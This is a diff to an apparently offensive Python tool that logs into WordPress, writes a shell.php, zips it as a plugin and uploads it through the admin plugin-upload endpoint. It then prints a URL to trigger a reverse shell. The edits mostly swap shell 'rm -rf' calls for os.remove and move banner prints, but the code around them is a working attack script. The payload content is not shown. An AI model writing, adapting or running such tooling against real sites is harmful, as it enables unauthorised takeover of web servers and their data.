@@ -3,7 +3,7 @@ from argparse import ArgumentParser
 from string import ascii_lowercase
 from random import choice
 from re import search
-from os import system
+from os import remove
 from zipfile import ZipFile
 from termcolor import colored as color
 from urllib3 import disable_warnings, exceptions
@@ -48,10 +48,6 @@ activate_shell = f"{host}/wp-content/plugins/{shell_directory}/shell.php"   #REV
 
 def Upload_plugin(SESSION,nonce):
 
-    print("***" * 15)
-    print("[+] Uploading Malicious Plugin...")
-    print("***" * 15 + "\n")
-
     #CREATE PLUGIN
 
     f = open("shell.php", "w")
@@ -61,7 +57,7 @@ def Upload_plugin(SESSION,nonce):
     ZIP.write("shell.php")
     ZIP.close()
 
-    system("rm -rf shell.php")
+    remove("shell.php")
 
     #CREATE POST REQUEST TO UPLOAD FILE
 
@@ -75,6 +71,10 @@ def Upload_plugin(SESSION,nonce):
 
     #SEND UPLOAD REQUEST
 
+    print("***" * 15)
+    print("[+] Uploading Malicious Plugin...")
+    print("***" * 15 + "\n")
+
     try:
         SESSION.post(
             url=host + "/wp-admin/update.php?action=upload-plugin",
@@ -83,17 +83,18 @@ def Upload_plugin(SESSION,nonce):
             verify=False,
             timeout=30
         )
-        system("rm -rf rev.zip")
+        remove("rev.zip")
 
     #IN CASE OF TIMEOUT OR CONNECTION FAIL, MANUALLY OPEN THE URL LINK TO RECEIVE CONNECTION
 
     except Exception:
 
+        remove("rev.zip")
         print(color("[✓] Plugin installed successfully\n", "white", attrs=["bold"]))
         print("[!] If you don't get the shell connection, manually trigger the URL:\n")
-        print("***" * 30)
+        print("***" * 20)
         print(activate_shell)
-        print("***" * 30 + "\n")
+        print("***" * 20 + "\n")
 
 
 def main(username, password):
